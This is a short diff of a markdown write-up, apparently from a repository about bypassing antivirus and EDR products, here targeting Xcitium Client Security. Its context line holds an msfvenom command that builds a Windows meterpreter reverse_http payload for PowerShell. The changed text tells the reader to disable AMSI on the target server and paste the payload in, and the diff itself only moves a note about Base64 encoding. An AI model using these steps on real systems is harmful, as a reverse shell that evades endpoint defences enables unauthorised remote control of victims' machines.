@@ -36,11 +36,11 @@ msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<HOST> LPORT=<PORT> -f ps
 
 On the target server, bypass AMSI using [command](https://github.com/MrEmpy/Awesome-AV-EDR-XDR-Bypass/tree/main/Xcitium%20Client%20Security#xcitium-client-security) shown above and then copy and paste the payload into Powershell.
 
-Note: in the screenshot at I encoded in Base64 to be in just one line.
-
 ### Execution
 
 ![](<../Xcitium Client Security/Images/ps-pl-msfv.png>)
+
+Note: in the screenshot at I encoded in Base64 to be in just one line.
 
 ![](<../Xcitium Client Security/Images/ps-pl-success1.png)
 
